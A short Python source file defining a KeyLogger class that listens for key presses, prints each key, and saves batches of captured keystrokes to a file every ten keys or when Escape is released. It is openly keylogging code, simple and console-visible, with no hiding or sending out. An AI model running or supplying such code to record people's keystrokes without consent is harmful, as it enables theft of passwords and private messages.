from logger import Key, Listener
from logger.utils import write_file

class KeyLogger:

    def __init__(self, write=True, keys_to_save=10):
        self.__keys = []
        self.__count = 0
        self.__write = write
        self.__keys_to_save = keys_to_save

    def run(self):
        with Listener(on_press=self.__on_press, on_release=self.__on_release) as listener:
            listener.join()

    def __on_press(self, key):
        self.__register_key(key)
        self.__count_key()
        print("{0} pressed".format(key))
    
    def __on_release(self, key):
        if key == Key.esc:
            if self.__count > 0 and self.__write: 
                write_file(self.__keys)
            return False

    def __register_key(self, key):
        self.__keys.append(key)

    def __count_key(self):
        self.__count += 1
        self.__verify_count_key()

    def __verify_count_key(self):
        if self.__count >= self.__keys_to_save:
            if self.__write: write_file(self.__keys)
            self.__clean_keys_and_counts()
    
    def __clean_keys_and_counts(self):
        self.__keys = []
        self.__count = 0